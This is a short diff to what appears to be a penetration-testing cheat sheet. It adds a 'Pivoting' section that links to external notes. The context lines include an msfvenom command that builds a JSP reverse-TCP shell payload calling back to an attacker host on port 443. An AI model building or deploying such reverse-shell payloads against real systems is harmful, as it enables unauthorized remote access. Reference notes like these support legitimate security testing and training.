@@ -68,6 +68,10 @@ MSFVenom Shell:
 --------------------------------------------------
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > shell.jsp  
 
+Pivoting:
+--------------------------------------------------
+https://github.com/21y4d/Notes/blob/master/Pivoting.txt  
+
 Links:
 --------------------------------------------------
 https://book.hacktricks.xyz/    //Cheat Sheet Pentesting all the thing   
